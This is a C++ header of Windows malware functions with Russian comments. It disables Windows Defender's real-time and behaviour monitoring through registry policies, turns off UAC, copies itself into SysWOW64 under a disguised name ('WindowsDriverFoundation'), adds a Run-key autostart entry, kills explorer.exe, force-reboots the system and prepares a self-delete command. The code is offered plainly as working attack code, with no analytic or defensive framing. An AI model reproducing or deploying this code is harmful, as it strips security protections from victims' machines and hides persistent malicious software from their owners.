#pragma once
#include "include.h"
bool isUserAdmin() {
    BOOL isAdmin = FALSE; // проверка на права администратора 
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        return false;
    }
    if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
        FreeSid(AdministratorsGroup);
        return false;
    }
    FreeSid(AdministratorsGroup);
    return isAdmin != FALSE;
}   
void DefenderOwner(){
    HKEY key;
    HKEY new_key;
    DWORD disable = 1;  // убийство Windows Defender вроде работает и на 11
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
        RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

        RegCloseKey(key);
        RegCloseKey(new_key);
    }
    LONG uacRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &key);
    if (uacRes == ERROR_SUCCESS) {
        DWORD uacDisable = 0;  // Устанавливаем значение для отключения UAC
        RegSetValueEx(key, "EnableLUA", 0, REG_DWORD, (const BYTE*)&uacDisable, sizeof(uacDisable));
        RegCloseKey(key);
        std::cout << "UAC has been disabled." << std::endl;
    }
    std::cout << "All done." << std::endl;
}
bool checkAndCreateFile(const std::string& filename) {
    std::string fullPath = "C:\\Windows\\SysWOW64\\" + filename; // Файл-чекпоинт создается только один раз

    std::ifstream file(fullPath);
    if (file) {
        return 1;
    }
    else {
        std::ofstream newFile(fullPath);
        if (newFile) {
            return 0;
        }
    }
}
void addToStartup() {
    char path[MAX_PATH];

    // Получаем путь к текущему исполняемому файлу
    GetModuleFileName(NULL, path, MAX_PATH);

    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS) {
        std::cerr << "No adm." << std::endl;
        return;
    }

    result = RegSetValueExA(hKey, "WindowsDriverFoundation", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        std::cout << "Done!" << std::endl;
    }
    else {
        std::cerr << "Err!" << std::endl;
    }
}
void restartSystem() {
    std::cout << "restarting" << std::endl;

    // меньше нельзя ставить иначе не все изменения реестра сохраняются на слабых пк
    std::this_thread::sleep_for(std::chrono::seconds(5));

    // Перезагрузка системы
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // Открываем токен текущего процесса
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "Error obtaining privileges!" << std::endl;
        return;
    }

    // Получаем привилегию SE_SHUTDOWN_NAME
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // токен привилегии
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) {
        std::cerr << "Error setting privileges!" << std::endl;
        return;
    }

    // Выполняем перезагрузку
    if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
        std::cerr << "Error while trying to reboot!" << std::endl;
    }
}
void restartAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExA(&sei)) {
        std::cerr << "Ошибка запуска от имени администратора!" << std::endl;
    }
}
void stopExplorer() {
    // Поиск процесса explorer.exe не обязательная функцияя так как есть поток который в фоне все закрывает
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    // Запускаем команду taskkill для завершения explorer.exe
    if (CreateProcess(NULL, (LPSTR)"taskkill /F /IM explorer.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE); // Ждем завершения процесса
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        std::cout << "Explorer.exe has been stopped." << std::endl;
    }
    else {
        std::cerr << "Failed to stop explorer.exe." << std::endl;
    }
}
bool copyAndRunSelf() {
    // Путь к текущему исполняемому файлу
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    // куда мы будем копировать программу
    const char* targetDirectory = "C:\\Windows\\SysWOW64\\";
    const char* targetFile = "WindowsDriverFoundation.exe";
    char destination[MAX_PATH];
    strcpy_s(destination, MAX_PATH, targetDirectory);
    strcat_s(destination, MAX_PATH, targetFile);

    // Проверяем находится программа уже в C:\Windows\SysWOW64
    if (strstr(path, targetDirectory) != NULL) {
        return 0;
    }


    // Копируем файл
    if (CopyFile(path, destination, FALSE)) {
        std::cout << "Файл успешно скопирован в C:\\Windows\\SysWOW64." << std::endl;
    }

    // Запускаем свою копию
    if (ShellExecute(NULL, "open", destination, NULL, NULL, SW_SHOWNORMAL)) {
        std::cout << "Успешно запущена копия программы." << std::endl;
        return 1;
    }
}
void deleteSelf() {
    // путь 
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    // Создаем команду для удаления себя с использованием командной строки
    std::string command = "cmd /c timeout /t 1 & del \"" + std::string(path) + "\"";
    // не уверен что это работает
}